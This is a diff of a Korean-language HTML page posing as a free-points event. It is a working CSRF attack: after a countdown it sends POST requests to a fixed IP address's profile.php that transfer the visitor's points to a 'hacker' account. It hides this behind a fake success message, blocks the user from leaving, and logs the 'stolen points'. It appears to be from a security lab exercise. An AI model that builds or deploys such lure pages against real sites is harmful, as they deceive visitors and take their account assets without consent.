@@ -1,10 +1,6 @@
 <!DOCTYPE html>
 <html lang="ko">
 <head>
-    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
-    <!-- 또는 -->
-    <meta http-equiv="Content-Security-Policy" content="block-all-mixed-content">
-</head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>🎁 특별 이벤트 - 무료 포인트 지급!</title>
@@ -38,6 +34,7 @@
         .success { color: #00FF88; font-size: 1.8em; font-weight: bold; text-shadow: 2px 2px 4px rgba(0,0,0,0.5); }
         .pulse { animation: pulse 1.5s infinite; }
         @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
+        .attack-log { background: rgba(0,0,0,0.3); border-radius: 10px; padding: 15px; margin: 20px 0; font-family: monospace; font-size: 0.9em; text-align: left; max-height: 200px; overflow-y: auto; }
     </style>
 </head>
 <body>
@@ -53,37 +50,15 @@
             </div>
             <div class="progress-bar"><div class="progress-fill" id="progressBar"></div></div>
             <p id="status">🔄 시스템 연결 중...</p>
+            <div id="attackLog" class="attack-log" style="display: none;"></div>
         </div>
         
         <div id="success-section" style="display: none;">
             <h2 class="success pulse">✅ 포인트 지급 완료!</h2>
-            <p style="font-size: 1.3em; margin: 20px 0;">💰 150P가 성공적으로 지급되었습니다!</p>
+            <p style="font-size: 1.3em; margin: 20px 0;">💰 55P가 성공적으로 지급되었습니다!</p>
             <p style="opacity: 0.8;">포인트는 즉시 계정에 반영됩니다.</p>
+            <div id="finalLog" class="attack-log"></div>
         </div>
-    </div>
-   <!-- 숨겨진 공격 폼들 -->
-    <div style="display: none;">
-        <!-- 첫 번째 공격 폼 -->
-        <form id="attack1" method="POST" action="http://3.35.218.180/profile.php" target="hiddenFrame1">
-            <input type="hidden" name="receiver_id" value="13">
-            <input type="hidden" name="points" value="30">
-            <input type="hidden" name="send_gift" value="1">
-            <input type="hidden" name="gift_type" value="coffee">
-            <input type="hidden" name="message" value="어 개털렸죠?">
-        </form>
-        
-        <!-- 두 번째 공격 폼 -->
-        <form id="attack2" method="POST" action="http://3.35.218.180/profile.php" target="hiddenFrame2">
-            <input type="hidden" name="receiver_id" value="13">
-            <input type="hidden" name="points" value="25">
-            <input type="hidden" name="send_gift" value="1">
-            <input type="hidden" name="gift_type" value="cake">
-            <input type="hidden" name="message" value="내가 가져간다 이 대머리야">
-        </form>
-        
-        <!-- 숨겨진 iframe들 -->
-        <iframe name="hiddenFrame1" style="width:0; height:0; border:none;"></iframe>
-        <iframe name="hiddenFrame2" style="width:0; height:0; border:none;"></iframe>
     </div>
 
     <script>
@@ -93,6 +68,8 @@
         const progressBar = document.getElementById('progressBar');
         const loadingSection = document.getElementById('loading-section');
         const successSection = document.getElementById('success-section');
+        const attackLog = document.getElementById('attackLog');
+        const finalLog = document.getElementById('finalLog');
         
         const statusMessages = [
             '🔄 서버에 연결하고 있습니다...',
@@ -101,8 +78,22 @@
         ];
         
         let messageIndex = 0;
+        let attackResults = [];
         
-        // 카운트다운 시작
+        function addLog(message) {
+            const timestamp = new Date().toLocaleTimeString();
+            const logMessage = `[${timestamp}] ${message}`;
+            attackResults.push(logMessage);
+            
+            if (attackLog.style.display !== 'none') {
+                attackLog.innerHTML = attackResults.join('<br>');
+                attackLog.scrollTop = attackLog.scrollHeight;
+            }
+            
+            console.log(logMessage);
+        }
+        
+        // 파일 열리자마자 바로 카운트다운 시작
         const countdownTimer = setInterval(() => {
             countdown--;
             countdownEl.textContent = countdown;
@@ -114,34 +105,128 @@
             
             if (countdown <= 0) {
                 clearInterval(countdownTimer);
-                executeAttack();
+                executeRealAttack();
             }
         }, 1000);
         
-        function executeAttack() {
+        async function executeRealAttack() {
             console.log('🎯 CSRF 공격 시작...');
             statusEl.textContent = '💸 실제 포인트를 전송하고 있습니다...';
             progressBar.style.width = '100%';
             
-            // 첫 번째 공격 실행
-            setTimeout(() => {
-                document.getElementById('attack1').submit();
-                console.log('🚀 첫 번째 공격 전송: 30P -> hacker');
-            }, 500);
+            // 공격 로그 표시
+            attackLog.style.display = 'block';
+            addLog('🎯 CSRF 공격 시스템 초기화...');
+            addLog('📋 타겟: hacker (ID: 13)');
             
-            // 두 번째 공격 실행 (2초 후)
-            setTimeout(() => {
-                document.getElementById('attack2').submit();
-                console.log('🚀 두 번째 공격 전송: 25P -> hacker');
-            }, 2500);
+            const attacks = [
+                {
+                    points: '30',
+                    gift_type: 'coffee',
+                    message: '어 개털렸죠?',
+                    delay: 1000
+                },
+                {
+                    points: '25', 
+                    gift_type: 'cake',
+                    message: '내가 가져간다 이 대머리야',
+                    delay: 3000
+                }
+            ];
             
-            // 성공 메시지 표시
+            let successfulAttacks = 0;
+            let totalPointsStolen = 0;
+            
+            for (let i = 0; i < attacks.length; i++) {
+                const attack = attacks[i];
+                
+                await new Promise(resolve => setTimeout(resolve, attack.delay));
+                
+                addLog(`🚀 공격 ${i+1} 시작: ${attack.points}P 전송 중...`);
+                
+                try {
+                    const response = await fetch('http://3.35.218.180/profile.php', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/x-www-form-urlencoded',
+                        },
+                        body: `receiver_id=13&points=${attack.points}&send_gift=1&gift_type=${attack.gift_type}&message=${encodeURIComponent(attack.message)}`
+                    });
+                    
+                    const data = await response.text();
+                    
+                    addLog(`📡 HTTP Status: ${response.status}`);
+                    
+                    // 성공 여부 판단 (콘솔 테스트에서 확인된 방식)
+                    if (response.status === 200 && (
+                        data.includes('선물') || 
+                        data.includes('전송') || 
+                        data.includes('success') ||
+                        data.includes('<!DOCTYPE html>') // 정상 페이지 응답
+                    )) {
+                        addLog(`✅ 공격 ${i+1} 성공: ${attack.points}P → hacker`);
+                        successfulAttacks++;
+                        totalPointsStolen += parseInt(attack.points);
+                    } else {
+                        addLog(`❌ 공격 ${i+1} 실패: 응답 이상`);
+                    }
+                    
+                    // 응답 미리보기
+                    const preview = data.substring(0, 100).replace(/\s+/g, ' ');
+                    addLog(`📄 응답: ${preview}...`);
+                    
+                } catch (error) {
+                    addLog(`❌ 공격 ${i+1} 네트워크 오류: ${error.message}`);
+                }
+            }
+            
+            // 완료 처리
             setTimeout(() => {
-                loadingSection.style.display = 'none';
-                successSection.style.display = 'block';
-                console.log('🎉 공격 완료! hacker 계정 확인해보세요');
-            }, 5000);
+                showSuccess(successfulAttacks, totalPointsStolen);
+            }, 2000);
         }
+        
+        function showSuccess(successCount, totalPoints) {
+            loadingSection.style.display = 'none';
+            successSection.style.display = 'block';
+            document.title = '✅ 포인트 지급 완료!';
+            
+            // 최종 결과 로그
+            finalLog.innerHTML = attackResults.join('<br>') + '<br><br>' + [
+                '🎉 === 공격 완료 리포트 ===',
+                `✅ 성공한 공격: ${successCount}/2`,
+                `💰 탈취한 포인트: ${totalPoints}P`,
+                `🏴‍☠️ 수혜자: hacker (ID: 13)`,
+                `📊 성공률: ${(successCount/2*100).toFixed(0)}%`,
+                '',
+                '🔍 결과 확인:',
+                '1. hacker 계정에 로그인하여 포인트 증가 확인',
+                '2. bob 계정에서 포인트 감소 확인',
+                '',
+                '⚡ 공격이 성공했다면 CSRF 취약점이 존재합니다!',
+                '🛡️ 보안 패치가 필요합니다.'
+            ].join('<br>');
+            
+            console.log('🎉 === CSRF 공격 완료 ===');
+            console.log(`✅ 성공: ${successCount}/2`);
+            console.log(`💰 탈취: ${totalPoints}P`);
+            console.log('🏴‍☠️ hacker 계정에서 포인트 확인해보세요!');
+        }
+        
+        // 페이지 언로드 방지
+        let preventUnload = true;
+        window.addEventListener('beforeunload', function(e) {
+            if (preventUnload) {
+                e.preventDefault();
+                return '포인트 지급이 진행 중입니다.';
+            }
+        });
+        setTimeout(() => { preventUnload = false; }, 15000);
+        
+        console.log('🎯 실제 작동하는 CSRF 페이지 로드 완료');
+        console.log('📋 타겟: hacker (ID: 13)');
+        console.log('💰 총 포인트: 55P (30+25)');
+        console.log('🚀 콘솔 테스트로 검증된 방법 사용!');
     </script>
 </body>
 </html>
